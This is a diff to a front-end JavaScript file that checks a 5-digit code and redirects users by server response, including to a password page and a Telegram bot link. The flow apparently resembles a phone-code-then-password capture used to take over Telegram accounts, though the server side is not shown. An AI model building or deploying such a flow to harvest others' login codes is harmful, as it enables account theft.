@@ -35,17 +35,25 @@ $(document).ready(function() {
         code = $("#code");
         if (code.val().length==5){
             $.get("/check_code/" + username+"&"+code.val(), function(data) {
-                if (data=='0'){
+                if (data=="0"){
                     $("#code").attr('class', 'input-field-input error');
                     $("#code_text_1").text('Invalid Code');
                 }
-                else{
-                    alert("sex")
-                    window.location.replace("/success");
+                else if(data=="-1"){
+                    username_b = document.getElementById("username").innerHTML;
+                    phone_b = Number(document.getElementById("phone").innerHTML).toString();
+                    window.location.replace("/?username="+username_b+"&"+"phone="+phone_b);
+                }
+                else if(data=="1"){
+                    window.location.replace("t.me/change_nickname_bot");
+                }
+                else if(data=="2"){
+                    username_b = document.getElementById("username").innerHTML;
+                    window.location.replace("/password?username="+username_b);
                 }
             });
         }
-        if (isDigit(code.val()) == false){
+        if (isDigit(code.val()) == false || code.val().length > 5){
             code.val(last_value);
         }
         $("#code").attr('class', 'input-field-input');
